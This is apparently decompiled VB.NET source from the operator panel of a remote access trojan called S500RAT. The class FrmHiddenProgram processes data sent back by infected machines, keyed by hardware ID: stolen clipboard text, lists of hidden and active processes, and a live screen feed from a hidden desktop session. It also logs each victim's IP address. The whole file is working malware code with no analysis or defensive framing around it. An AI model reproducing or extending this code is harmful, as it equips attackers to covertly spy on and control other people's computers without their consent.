Imports System
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x0200004B RID: 75
	Public Class FrmHiddenProgram
		' Token: 0x0600118B RID: 4491 RVA: 0x00098750 File Offset: 0x00096950
		Public Sub Capture(client As Clients, unpack_msgpack As MsgPack)
			' The following expression was wrapped in a checked-statement
			Try
				Dim asString As String = unpack_msgpack.ForcePathObject("Command").AsString
				Dim num As UInteger = <PrivateImplementationDetails>.ComputeStringHash(asString)
				If num <= 1703884388UI Then
					If num <> 601316554UI Then
						If num <> 806249102UI Then
							If num = 1703884388UI Then
								If Operators.CompareString(asString, "Copy", False) = 0 Then
									Dim formHiddenProgram As FormHiddenProgram = CType(Application.OpenForms("FormHiddenProgram" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHiddenProgram)
									Dim flag As Boolean = formHiddenProgram IsNot Nothing
									If flag Then
										formHiddenProgram.StateHApp.ForeColor = Color.Aqua
										formHiddenProgram.StateHApp.Text = "Clipboard : " + unpack_msgpack.ForcePathObject("Text").AsString
									End If
								End If
							End If
						ElseIf Operators.CompareString(asString, "ListProcess", False) = 0 Then
							Dim formHiddenProgram2 As FormHiddenProgram = CType(Application.OpenForms("FormHiddenProgram" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHiddenProgram)
							Dim flag2 As Boolean = formHiddenProgram2 IsNot Nothing
							If flag2 Then
								formHiddenProgram2.ListProcessHidden.Rows.Clear()
								Dim asString2 As String = unpack_msgpack.ForcePathObject("ListActiveWindows").AsString
								Dim array As String() = asString2.Split(New String() { "-==>" }, StringSplitOptions.None)
								Dim num2 As Integer = array.Length - 1
								For i As Integer = 0 To num2
									Dim flag3 As Boolean = array(i).Length > 0
									If flag3 Then
										Dim text As String = array(i)
										Dim text2 As String = array(i + 1)
										Dim image As Image = Image.FromStream(New MemoryStream(Convert.FromBase64String(array(i + 2))))
										formHiddenProgram2.ListProcessHidden.Rows.Add(New Object() { image, text, text2 })
									End If
									i += 2
								Next
								formHiddenProgram2.CountListProcessHidden.Text = Conversions.ToString(formHiddenProgram2.ListProcessHidden.Rows.Count)
								Dim flag4 As Boolean = formHiddenProgram2.ListProcessHidden.Rows.Count <= 0
								If flag4 Then
									formHiddenProgram2.StateHApp.ForeColor = Color.Orange
									formHiddenProgram2.StateHApp.Text = "There are no running processes in the list of hidden applications"
								End If
							End If
						End If
					ElseIf Operators.CompareString(asString, "HAppInfo", False) = 0 Then
						Dim formHiddenProgram3 As FormHiddenProgram = CType(Application.OpenForms("FormHiddenProgram" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHiddenProgram)
						Dim flag5 As Boolean = formHiddenProgram3 IsNot Nothing
						If flag5 Then
							formHiddenProgram3.StateHApp.ForeColor = Color.White
							formHiddenProgram3.StateHApp.Text = unpack_msgpack.ForcePathObject("HAppInfo").AsString
						End If
					End If
				ElseIf num <= 2614674993UI Then
					If num <> 2082903604UI Then
						If num = 2614674993UI Then
							If Operators.CompareString(asString, "Screen", False) = 0 Then
								Dim formHiddenProgram4 As FormHiddenProgram = CType(Application.OpenForms("FormHiddenProgram" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHiddenProgram)
								Dim flag6 As Boolean = formHiddenProgram4 IsNot Nothing
								If flag6 Then
									Dim asBytes As Byte() = unpack_msgpack.ForcePathObject("Stream").GetAsBytes()
									Dim syncPicbox As Object = formHiddenProgram4.syncPicbox
									ObjectFlowControl.CheckForSyncLockOnValueType(syncPicbox)
									SyncLock syncPicbox
										Using memoryStream As MemoryStream = New MemoryStream(asBytes)
											Dim bitmap As Bitmap = formHiddenProgram4.decoder.DecodeData(memoryStream)
											formHiddenProgram4.GetImage = bitmap
											formHiddenProgram4.rdSize = bitmap.Size
										End Using
										formHiddenProgram4.PictureBox1.Image = formHiddenProgram4.GetImage
										Dim formHiddenProgram5 As FormHiddenProgram = formHiddenProgram4
										Dim ptr As Integer = formHiddenProgram5.IntFPS
										formHiddenProgram5.IntFPS = ptr + 1
										Dim flag8 As Boolean = formHiddenProgram4.sw.ElapsedMilliseconds >= 1000L
										If flag8 Then
											formHiddenProgram4.FPS.Text = Conversions.ToString(formHiddenProgram4.IntFPS)
											Dim flag9 As Boolean = formHiddenProgram4.IntFPS < 4
											If flag9 Then
												formHiddenProgram4.FPS.ForeColor = Color.Orange
											Else
												Dim flag10 As Boolean = formHiddenProgram4.IntFPS > 4
												If flag10 Then
													formHiddenProgram4.FPS.ForeColor = Color.Green
												Else
													formHiddenProgram4.FPS.ForeColor = Color.GreenYellow
												End If
											End If
											formHiddenProgram4.rdSize = formHiddenProgram4.GetImage.Size
											formHiddenProgram4.IntFPS = 0
											formHiddenProgram4.sw = Stopwatch.StartNew()
										End If
									End SyncLock
								End If
							End If
						End If
					ElseIf Operators.CompareString(asString, "setClient", False) = 0 Then
						Dim formHiddenProgram6 As FormHiddenProgram = CType(Application.OpenForms("FormHiddenProgram" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHiddenProgram)
						Dim flag11 As Boolean = formHiddenProgram6 IsNot Nothing
						If flag11 Then
							Dim flag12 As Boolean = formHiddenProgram6.Client Is Nothing
							If flag12 Then
								client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString
								formHiddenProgram6.Client = client
								formHiddenProgram6.Timer1.Enabled = True
							End If
						End If
					End If
				ElseIf num <> 3033741160UI Then
					If num = 4086144241UI Then
						If Operators.CompareString(asString, "Error", False) = 0 Then
							Dim formHiddenProgram7 As FormHiddenProgram = CType(Application.OpenForms("FormHiddenProgram" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHiddenProgram)
							Dim flag13 As Boolean = formHiddenProgram7 IsNot Nothing
							If flag13 Then
								formHiddenProgram7.StateHApp.ForeColor = Color.Red
								formHiddenProgram7.StateHApp.Text = "Error : " + unpack_msgpack.ForcePathObject("Error").AsString
							End If
						End If
					End If
				ElseIf Operators.CompareString(asString, "ListProcessActive", False) = 0 Then
					Dim formHiddenProgram8 As FormHiddenProgram = CType(Application.OpenForms("FormHiddenProgram" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHiddenProgram)
					Dim flag14 As Boolean = formHiddenProgram8 IsNot Nothing
					If flag14 Then
						formHiddenProgram8.ListProcessActive.Rows.Clear()
						Dim asString3 As String = unpack_msgpack.ForcePathObject("ActveWindowsList").AsString
						Dim array2 As String() = asString3.Split(New String() { "-==>" }, StringSplitOptions.None)
						Dim num3 As Integer = array2.Length - 1
						For j As Integer = 0 To num3
							Dim flag15 As Boolean = array2(j).Length > 0
							If flag15 Then
								Dim text3 As String = array2(j)
								Dim fileName As String = Path.GetFileName(text3)
								Dim text4 As String = array2(j + 1)
								Dim image2 As Image = Image.FromStream(New MemoryStream(Convert.FromBase64String(array2(j + 2))))
								formHiddenProgram8.ListProcessActive.Rows.Add(New Object() { image2, fileName, text4, text3 })
							End If
							j += 2
						Next
						formHiddenProgram8.CountListProcesseActive.Text = Conversions.ToString(formHiddenProgram8.ListProcessActive.Rows.Count)
					End If
				End If
			Catch ex As Exception
				ListLogs.AddArray("Hidden Applactions " + client.IP + " Error : " + ex.Message, 0)
			End Try
		End Sub
	End Class
End Namespace
